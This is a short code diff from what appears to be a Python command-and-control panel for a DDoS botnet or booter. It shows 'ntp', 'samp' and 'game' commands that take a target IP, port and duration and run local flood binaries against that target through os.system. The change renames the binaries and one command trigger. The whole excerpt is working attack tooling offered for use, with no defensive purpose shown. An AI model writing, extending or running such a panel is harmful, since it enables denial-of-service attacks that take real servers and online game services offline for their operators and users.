@@ -441,12 +441,12 @@ def main():
                 print('Usage: ntp <ip> <port> <throttle> <time>')
                 print('Example: ntp 1.1.1.1 22 250 60')
                 
-        elif "samp" in cnc:
+        elif "samp-d" in cnc:
             try:
                 ip = cnc.split()[1]
                 port = cnc.split()[2]
                 time = cnc.split()[3]
-                os.system(f'./SAMP {ip} {port} {time}')
+                os.system(f'./samp-d {ip} {port} {time}')
             except IndexError:
                 print('Usage: samp <ip> <port> <time>')
                 print('Example: samp 1.1.1.1 80 60')
@@ -457,7 +457,7 @@ def main():
                 port = cnc.split()[2]
                 time = cnc.split()[3]
                 thread = cnc.split()[4]
-                os.system(f'./GAME {ip} {port} {time} {thread}')
+                os.system(f'./game {ip} {port} {time} {thread}')
             except IndexError:
                 print('Usage: game <ip> <port> <time> <threads>')
                 print('Example: game 1.1.1.1 80 60 3')
